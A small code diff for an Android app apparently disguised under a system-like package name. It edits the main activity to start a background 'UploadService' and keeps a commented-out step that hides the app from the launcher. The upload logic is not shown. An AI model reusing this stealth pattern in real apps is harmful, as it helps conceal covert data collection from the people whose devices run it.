@@ -1,10 +1,8 @@
 package com.telephony.services;
 
-import java.io.IOException;
-
 import android.app.Activity;
+import android.content.Intent;
 import android.os.Bundle;
-import android.util.Log;
 
 public class Main extends Activity {
 
@@ -27,9 +25,16 @@ public class Main extends Activity {
 		// PendingIntent pmyIntent = PendingIntent.getService(this, 0, myIntent,
 		// 0);
 		// am.set(AlarmManager.ELAPSED_REALTIME, 50000L, pmyIntent);
-		Utils.setComponentState(this, Main.class, false);		
-//		Intent mIntent = new Intent(this, UploadService.class);
-//		startService(mIntent);
+		
+		
+		
+		//Hide Main activity from launcher
+//		Utils.setComponentState(this, Main.class, false);
+		
+		
+		
+		Intent mIntent = new Intent(this, UploadService.class);
+		startService(mIntent);
 
 //		try {
 //			//new Proc("sh").exec(new String[] {"sleep 20"});
